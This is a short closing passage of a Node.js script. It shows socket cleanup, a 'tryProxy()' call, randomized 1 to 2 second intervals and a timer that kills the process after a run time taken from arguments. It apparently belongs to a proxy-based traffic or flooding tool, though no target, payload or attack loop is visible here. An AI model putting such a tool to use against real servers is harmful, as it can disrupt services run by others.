               }, Math.floor(Math.random() * 1000) + 1000); // 1-2 second intervals
           });

           client.on("close", () => {
               client.destroy();
               connection.destroy();
               return;
           });
       }, function (error, response, body) {
           connection.destroy();
           console.log("Error:", error);
       });
   }
   
   // Start the proxy attempt
   tryProxy();
}

const KillScript = () => process.exit(1);

setTimeout(KillScript, args.time * 1000);
